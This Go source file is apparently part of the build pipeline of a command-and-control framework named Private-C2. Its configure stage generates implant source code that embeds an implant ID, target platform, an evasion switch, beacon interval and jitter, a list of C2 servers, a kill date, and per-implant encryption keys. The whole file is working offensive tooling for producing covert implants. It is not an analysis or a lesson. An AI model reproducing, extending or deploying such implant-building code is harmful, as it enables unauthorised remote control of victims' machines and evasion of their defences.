package stages

import (
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/azizbinmohammad/private-c2/server/build"
)

// ConfigureResult holds the output of the configure stage.
type ConfigureResult struct {
	SourceDir string
	BuildTags []string
	ImplantID string
}

// Configure generates the implant configuration source files, embeds crypto
// keys, sets build tags, and generates a unique implant ID.
func Configure(cfg *build.BuildConfig, workDir string) (*ConfigureResult, error) {
	if cfg.ImplantID == "" {
		id, err := generateImplantID()
		if err != nil {
			return nil, fmt.Errorf("generate implant ID: %w", err)
		}
		cfg.ImplantID = id
	}

	srcDir := filepath.Join(workDir, "implant_src")
	if err := os.MkdirAll(srcDir, 0o700); err != nil {
		return nil, fmt.Errorf("create source dir: %w", err)
	}

	if err := generateConfigSource(cfg, srcDir); err != nil {
		return nil, fmt.Errorf("generate config source: %w", err)
	}

	if err := embedCryptoKeys(cfg, srcDir); err != nil {
		return nil, fmt.Errorf("embed crypto keys: %w", err)
	}

	return &ConfigureResult{
		SourceDir: srcDir,
		BuildTags: cfg.BuildTags(),
		ImplantID: cfg.ImplantID,
	}, nil
}

// generateImplantID creates a cryptographically random implant identifier.
func generateImplantID() (string, error) {
	b := make([]byte, 16)
	if _, err := rand.Read(b); err != nil {
		return "", err
	}
	return hex.EncodeToString(b), nil
}

// generateConfigSource writes the embedded configuration Go source file that
// the implant compiles against. The generated code is a simple Go file with
// package-level variables holding each configuration value.
func generateConfigSource(cfg *build.BuildConfig, srcDir string) error {
	var sb strings.Builder

	sb.WriteString("package config\n\n")
	sb.WriteString("// Code generated by Private-C2 build pipeline. DO NOT EDIT.\n\n")
	sb.WriteString("import \"time\"\n\n")

	sb.WriteString(fmt.Sprintf("const ImplantID = %q\n", cfg.ImplantID))
	sb.WriteString(fmt.Sprintf("const TargetOS = %q\n", cfg.TargetOS))
	sb.WriteString(fmt.Sprintf("const TargetArch = %q\n", cfg.TargetArch))
	sb.WriteString(fmt.Sprintf("const Mode = %q\n", cfg.Mode))
	sb.WriteString(fmt.Sprintf("const Debug = %t\n", cfg.Debug))
	sb.WriteString(fmt.Sprintf("const Evasion = %t\n", cfg.Evasion))
	sb.WriteString(fmt.Sprintf("const SafeMode = %t\n", cfg.SafeMode))
	sb.WriteString(fmt.Sprintf("const Interval = time.Duration(%d)\n", cfg.Interval))
	sb.WriteString(fmt.Sprintf("const Jitter = %f\n", cfg.Jitter))

	sb.WriteString("\nvar C2Servers = []string{\n")
	for _, s := range cfg.C2Servers {
		sb.WriteString(fmt.Sprintf("\t%q,\n", s))
	}
	sb.WriteString("}\n")

	sb.WriteString("\nvar Transports = []string{\n")
	for _, t := range cfg.Transports {
		sb.WriteString(fmt.Sprintf("\t%q,\n", t))
	}
	sb.WriteString("}\n")

	sb.WriteString("\nvar Features = []string{\n")
	for _, f := range cfg.Features {
		sb.WriteString(fmt.Sprintf("\t%q,\n", f))
	}
	sb.WriteString("}\n")

	if cfg.KillDate != nil {
		sb.WriteString(fmt.Sprintf("\nvar KillDate = time.Unix(%d, 0)\n", cfg.KillDate.Unix()))
	} else {
		sb.WriteString("\nvar KillDate = time.Time{}\n")
	}

	// Write timestamp of build
	sb.WriteString(fmt.Sprintf("\nconst BuildTimestamp = %q\n", time.Now().UTC().Format(time.RFC3339)))

	configPath := filepath.Join(srcDir, "config.go")
	return os.WriteFile(configPath, []byte(sb.String()), 0o600)
}

// embedCryptoKeys generates per-implant key material and writes it to the
// source directory as a Go file with embedded byte slices.
func embedCryptoKeys(cfg *build.BuildConfig, srcDir string) error {
	// Generate a per-implant symmetric key (32 bytes).
	symmetricKey := make([]byte, 32)
	if _, err := rand.Read(symmetricKey); err != nil {
		return fmt.Errorf("generate symmetric key: %w", err)
	}

	// Generate a per-implant session seed (64 bytes).
	sessionSeed := make([]byte, 64)
	if _, err := rand.Read(sessionSeed); err != nil {
		return fmt.Errorf("generate session seed: %w", err)
	}

	var sb strings.Builder
	sb.WriteString("package config\n\n")
	sb.WriteString("// Code generated by Private-C2 build pipeline. DO NOT EDIT.\n\n")

	sb.WriteString("var SymmetricKey = []byte{")
	for i, b := range symmetricKey {
		if i > 0 {
			sb.WriteString(", ")
		}
		sb.WriteString(fmt.Sprintf("0x%02x", b))
	}
	sb.WriteString("}\n\n")

	sb.WriteString("var SessionSeed = []byte{")
	for i, b := range sessionSeed {
		if i > 0 {
			sb.WriteString(", ")
		}
		sb.WriteString(fmt.Sprintf("0x%02x", b))
	}
	sb.WriteString("}\n")

	keysPath := filepath.Join(srcDir, "keys.go")
	return os.WriteFile(keysPath, []byte(sb.String()), 0o600)
}
